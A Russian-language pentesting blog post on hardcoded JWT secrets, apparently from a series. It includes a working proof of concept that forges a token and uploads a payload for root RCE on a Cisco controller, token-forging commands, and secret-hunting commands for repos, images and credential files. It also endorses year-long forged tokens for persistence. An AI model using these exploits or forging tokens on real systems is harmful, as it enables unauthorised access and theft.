---
title: "JWT, часть 17: Hardcoded secrets - когда секрет лежит в открытом коде"
date: 2026-04-03T20:17:00+03:00
number: 17
tags: ["jwt", "security", "web", "auth"]
summary: "CVE-2025-20188 (CVSS 10.0): восемь символов 'notfound' в Lua-скрипте Cisco IOS XE = root RCE на enterprise-оборудовании. 17% JWT CVE за 2024-2026 — захардкоженные секреты. Где искать: git-история, Docker-слои, JS-бандлы, source maps, firmware."
---

**Содержание:**
- [CVE-2025-20188: Cisco IOS XE, CVSS 10.0](#cve-2025-20188-cisco-ios-xe-cvss-100)
- [17% JWT CVE за 2024-2026 - захардкоженные секреты](#17-jwt-cve-за-2024-2026---захардкоженные-секреты)
- [Как искать захардкоженные секреты](#как-искать-захардкоженные-секреты)
- [JS-бандлы и source maps](#js-бандлы-и-source-maps)
- [Быстрая проверка дефолтных секретов](#быстрая-проверка-дефолтных-секретов)
- [Что делать после находки](#что-делать-после-находки)
- [Где ещё искать](#где-ещё-искать)
- [Почему это не прекратится](#почему-это-не-прекратится)
- [Что дальше](#что-дальше)

Вы могли заметить что нет 15 и 16 статей. Я целенаправленно не стал их публиковать, так как посчитал их недостаточно глубоко проработанными. Возможно они появятся позже или не появятся вовсе. В любом случае их наличие в этой серии ни на что не влияет.

В статье 7 я показывал, как брутить JWT-секреты hashcat-ом на GPU. 150 миллионов попыток в секунду на RTX 4090, специализированные словари, правила мутации. А что если секрет - просто слово `notfound` в открытом исходном коде? Зачем брутить то, что можно прочитать?

## CVE-2025-20188: Cisco IOS XE, CVSS 10.0

Я упоминал этот кейс в первой статье. Теперь расскажу полностью.

Cisco IOS XE Wireless Controller. Функция Out-of-Band AP Image Download. Lua-скрипт на контроллере читает JWT-ключ из файла `/tmp/nginx_jwt_key`. Файла нет (его должна создать другая служба при инициализации). Fallback:

```lua
secret_read = 'notfound'  -- HARDCODED FALLBACK
```

Восемь символов в нижнем регистре. hashcat на RTX 4090 перебрал бы все 8-символьные комбинации [a-z] за ~23 минуты (26^8 ≈ 208 миллиардов вариантов / 150M в секунду - как я считал в статье 7). Но искать не надо - секрет лежит в исходном коде Lua-скрипта.

Атакующий подписывает JWT этим секретом, загружает произвольный файл через AP Image Download endpoint, получает root RCE. PoC:

```python
import jwt, time, requests

token = jwt.encode(
    {"reqid": "x", "exp": int(time.time()) + 3600},
    "notfound", algorithm="HS256")

requests.post("https://wlc.corp.local/aparchive/upload",
    cookies={"jwt": token},
    files={"file": ("pwn.tar", open("payload.tar", "rb"))})
```

CVSS 10.0. Неаутентифицированный RCE на сетевом оборудовании уровня предприятия. Из-за восьми символов.

## 17% JWT CVE за 2024-2026 - захардкоженные секреты

Cisco не одиноки. Статистика за 2024-2026: каждый шестой JWT-баг - это тупо захардкоженный секрет.

**CVE-2025-30206 (Dpanel, CVSS 9.8)** - Docker visualization panel. JWT-секрет захардкожен прямо в исходном коде на GitHub. Читаешь код, генерируешь admin-токен, получаешь контроль над хост-машиной через Docker API.

**CVE-2025-13877 (NocoBase, CVSS 5.6)** - официальный `docker-compose.yml` ставит `APP_KEY=your-secret-key`. Этот ключ используется как JWT-секрет. Каждая дефолтная установка по документации - открытая дверь. CVSS ниже чем у Cisco и Dpanel так как нужна аутентификация для эксплуатации, но дефолтный ключ всё равно позволяет подделать токен любого пользователя.

Паттерн один и тот же: разработчик пишет fallback-значение "на случай если переменная окружения не задана". Fallback попадает в продакшн. Или `docker-compose.yml` с дефолтами копируется как есть.

## Как искать захардкоженные секреты

**В git-репозиториях:**

```bash
# trufflehog - сканирует всю git-историю
trufflehog git https://github.com/megabank-example/core-api --only-verified

# gitleaks - быстрый сканер
gitleaks detect -s /path/to/repo -v
```

trufflehog проходит по каждому коммиту, включая удалённые и squashed. Секрет был в коде, потом убран? trufflehog всё равно найдёт.

**⚠️ Про `--only-verified`:** этот флаг отправляет найденные credentials к реальным сервисам (AWS, GitHub, Slack API) для проверки, что секрет рабочий. На пентесте это означает: live API calls от твоей машины, audit trail на стороне сервиса, возможные SOC alerts у клиента. Используйте `--only-verified` только когда это явно можно сделать.

**В Docker-образах:**

```bash
# Метаданные: ENV/ARG с секретами в Dockerfile-инструкциях
docker history --no-trunc megabank/core-api

# Нативное сканирование всех слоёв (800+ детекторов)
trufflehog docker --image megabank/core-api

# Или ручной вариант для quick check
docker save megabank/core-api | tar -xO | \
  strings | grep -iE "jwt|secret|signing|key"
```

Docker-образ - это набор слоёв. Даже если секрет удалён в последнем слое, предыдущие слои всё ещё его содержат. `docker history --no-trunc` покажет полные Dockerfile-инструкции, включая `ENV JWT_SECRET=...` и `ARG` со значениями по умолчанию. `trufflehog docker --image` прогоняет все слои через 800+ детекторов - точнее и быстрее ручного `strings | grep`.

**В firmware:**

```bash
strings firmware.bin | grep -iE "jwt|secret|key|hmac|signing"
```

**В мобильных приложениях:**

```bash
# APK (Android)
apktool d app.apk
grep -riE "jwt|secret|signing" app/

# IPA (iOS) - после распаковки
strings Payload/App.app/App | grep -iE "jwt|secret"
```

## JS-бандлы и source maps

SPA на React, Angular или Vue - самый частый источник JWT-секретов на web-engagement'ах. И для этого не нужен доступ к репозиторию - только браузер.

Webpack-бандлы содержат весь клиентский JavaScript, включая конфигурацию. Разработчик пишет `process.env.JWT_SECRET` в коде, Webpack заменяет на реальное значение при сборке. Результат - секрет в открытом виде в `app.bundle.js`.

Source maps на проде - отправляем в Burp Repeater, в ответе ищем полный исходник:

```http
GET /static/js/main.chunk.js.map HTTP/2
Host: app.megabank.example
```

В Response ищем массив `sources` - список всех исходных файлов. Секреты часто в `config.js`, `env.js`, `constants.js`.

Бандлы - в Response Tab используем поиск (`Ctrl+F`) по паттернам `jwt`, `secret`, `signing`, `key`:

```http
GET /static/js/main.3a7f2b.bundle.js HTTP/2
Host: app.megabank.example
```

`window.__CONFIG__` и глобальные конфиги - запрашиваем главную страницу, в Response ищем `window.__`:

```http
GET / HTTP/2
Host: app.megabank.example
```

Что искать:
- `*.js.map` файлы - source maps с полным исходным кодом
- `window.__CONFIG__`, `window.__ENV__` - глобальные конфиги
- `process.env.*` заменённые Webpack/Vite на реальные значения при сборке
- Inline `<script>` с конфигурацией в HTML

## Быстрая проверка дефолтных секретов

Перед hashcat - проверь самые частые секреты. jwt_tool с wordlist от Wallarm (который мы использовали в статье 7):

```bash
python3 jwt_tool.py "$TOKEN" -C -d jwt.secrets.list
```

Или ручная проверка на Python - без зависимостей, без shell interpolation:

```python
import hmac, hashlib, base64, sys

token = sys.argv[1]
parts = token.split('.')
msg = f"{parts[0]}.{parts[1]}".encode()
actual_sig = parts[2]

secrets = [
    "secret", "password", "your-256-bit-secret",
    "notfound", "changeme", "test", "development",
    "your-secret-key", "jwt_secret", "s3cret",
]

for s in secrets:
    sig = base64.urlsafe_b64encode(
        hmac.new(s.encode(), msg,
        hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    if sig == actual_sig:
        print(f"FOUND: {s}")
```

```bash
python3 check_secret.py "$TOKEN"
```

`your-256-bit-secret` - дефолт с jwt.io, который разработчики копируют в продакшн. `notfound` - Cisco IOS XE. `changeme` - классика из .env.example. `your-secret-key` - NocoBase.

Типичные дефолты фреймворков, которые стоит добавить в словарь:

| Фреймворк | Переменная | Дефолт |
|-----------|------------|--------|
| Django | `SECRET_KEY` | `django-insecure-*` (префикс) |
| Laravel | `APP_KEY` | `base64:...` (из .env.example) |
| Spring Boot | `jwt.secret` в `application.yml` | часто `secret` или `mySecretKey` |
| Express/Node | `JWT_SECRET` | `shhh`, `secret`, `keyboard cat` |
| Rails | `secret_key_base` | из `credentials.yml.enc` |
| ASP.NET | `Jwt:Key` в `appsettings.json` | `your-256-bit-secret` |

## Что делать после находки

Нашёл секрет - это полдела. Дальше:

1. **Forge admin-токен.** Подписываешь JWT с `"sub": "admin"`, `"role": "superadmin"` или что используется в конкретном приложении
2. **Проверь все endpoints.** Один секрет может давать доступ к API, admin-панели, внутренним сервисам
3. **Cross-environment.** Секрет из staging часто совпадает с production. Из `.env.development` - с `.env.production`. Проверяй
4. **Blast radius.** Один HMAC-секрет на 50 микросервисов - компрометация одного = доступ ко всем
5. **Long-lived tokens.** Подпиши токен с `"exp"` на год вперёд - persistent access, даже если секрет потом поменяют (если сервер не проверяет revocation list). Спорно с точки зрения этики, но бесспорно с точки зрения баунти.

```bash
# Forge admin-токен через jwt_tool
python3 jwt_tool.py "$TOKEN" -T -S hs256 \
  -p "найденный_секрет" \
  -pc sub -pv "admin" \
  -pc role -pv "superadmin"
```

## Где ещё искать

Помимо исходного кода, Docker-образов и JS-бандлов:

- **`.git/` на веб-сервере**: misconfigured nginx/Apache - `/.git/` доступен - git-dumper восстанавливает весь репозиторий с историей. Проверяй `https://app.megabank.example/.git/HEAD` - если вернул `ref: refs/heads/main`, репо доступен
- **CI/CD**: GitHub Actions logs, Jenkins `credentials.xml`, GitLab CI variables, `.env` в build artifacts, Terraform state files с секретами в открытом виде
- **GitHub поиск**: `jwt_secret` или `JWT_SECRET` в публичных репозиториях
- **Переменные окружения**: через LFI - `/proc/self/environ`, SSRF, `phpinfo()`, Spring Boot `/actuator/env`, SSTI - `{{config.SECRET_KEY}}`, Node.js debug error pages с `process.env`
- **.env файлы**: часто попадают в git (`.env`, `.env.production`, `.env.local`)
- **docker inspect**: `docker inspect container_id | grep -i secret`
- **Kubernetes secrets**: `kubectl get secrets -o yaml` - base64, **не** encryption. Дефолтный etcd хранит секреты в открытом виде
- **AWS Parameter Store / Secrets Manager**: через SSRF к metadata endpoint (статья 6)
- **Приватные ключи**: всё вышесказанное относится и к RSA/ECDSA. PEM-файлы в репозиториях, JWK с параметром `"d"` (приватная экспонента), base64-encoded private keys в переменных окружения. В enterprise асимметричные алгоритмы доминируют - утечка приватного ключа = полная компрометация подписи

## Почему это не прекратится

Разработчик пишет `JWT_SECRET=changeme` в `.env.example`. Кто-то копирует в `.env` и забывает поменять. `docker-compose.yml` с дефолтом `SECRET_KEY=your-secret-key` становится production. Fallback `|| "secret"` в коде оказывается единственным источником ключа когда переменная окружения не задана.

Правильный подход:

```bash
# Генерация криптографически стойкого секрета
python3 -c "import secrets; print(secrets.token_hex(32))"

# Или через openssl
openssl rand -base64 32
```

256 бит из CSPRNG. Не человеческое слово, не дефолт фреймворка, не fallback. RFC 7518 требует ключ HS256 не менее 256 бит, RFC 8725 усиливает: ключ должен быть из криптографически стойкого генератора, не человекочитаемый пароль (статья 7).

И ротация: даже сильный ключ должен меняться. Используй `kid` для версионирования (статья 5) - это позволяет менять ключи без инвалидации существующих токенов.

Но прямо сейчас можно зайти на GitHub, поискать `jwt_secret` в публичных репозиториях - и найти десятки рабочих секретов.

## Что дальше

17 статей про то, как JWT ломается (пока что не 17, но сделаем вид что 17). Логичный вопрос - а что вместо? В следующей статье - PASETO (JWT без поля alg), Macaroons (токены с суперспособностью attenuation), server-side sessions и гибридный подход 2026 года.
